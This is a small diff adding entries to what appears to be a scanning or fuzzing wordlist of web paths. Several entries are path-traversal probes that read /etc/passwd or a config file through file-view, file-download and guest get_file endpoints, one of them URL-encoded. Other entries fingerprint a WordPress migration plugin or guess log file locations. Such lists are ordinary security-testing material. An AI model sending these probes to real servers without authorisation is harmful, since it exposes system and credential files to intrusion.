@@ -66,3 +66,6 @@
 
 /api/system/fileView?file=/etc/passwd
 /api/system/fileDownload?file=/etc/passwd
+/index.php/guest/get/get_file/..%2f..%2fipconfig.php
+/wp-content/plugins/all-in-one-wp-migration/readme.txt
+/wp-content/uploads/{{logname}}.log
